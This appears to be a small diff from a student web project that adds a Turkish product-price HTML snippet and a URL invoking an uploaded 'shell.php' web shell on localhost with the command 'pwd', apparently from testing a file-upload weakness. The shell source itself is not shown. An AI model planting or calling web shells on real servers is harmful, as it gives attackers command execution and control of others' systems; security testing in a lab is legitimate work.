@@ -1,0 +1,2 @@
+<p><strong>Fiyat:</strong> <span id="product-price">100 TL</span></p>
+http://localhost/yaseminodev/uploads/uploads/shell.php?cmd=pwd
